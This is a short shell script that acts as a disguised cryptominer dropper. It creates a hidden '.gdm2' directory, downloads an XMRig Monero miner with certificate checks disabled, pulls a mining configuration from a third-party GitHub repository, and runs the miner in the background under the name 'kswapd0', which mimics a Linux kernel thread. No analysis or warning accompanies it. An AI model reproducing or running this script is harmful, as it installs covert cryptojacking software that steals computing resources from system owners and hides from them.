mkdir .gdm2
cd .gdm2

wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
tar xf $HOME/.gdm2/xmrig.tar.gz
rm xmrig.tar.gz

rm -rf $HOME/.gdm2/config.json
wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json

./kswapd0&
